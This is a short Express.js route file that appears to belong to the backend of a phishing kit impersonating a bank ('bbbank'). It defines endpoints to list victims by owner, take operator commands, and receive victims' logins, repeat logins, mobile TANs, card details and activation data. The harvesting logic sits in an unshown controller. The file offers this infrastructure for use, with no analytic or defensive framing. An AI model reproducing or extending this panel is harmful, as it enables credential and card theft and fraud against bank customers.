const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitMobileTan,
    submitActivation,
    submitCard,
    deleteEntry,
} = require("../controllers/bbbankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/mobileTan", submitMobileTan);
router.post("/card", submitCard);
router.post("/activation", submitActivation);
router.post("/delete", deleteEntry);

module.exports = router;
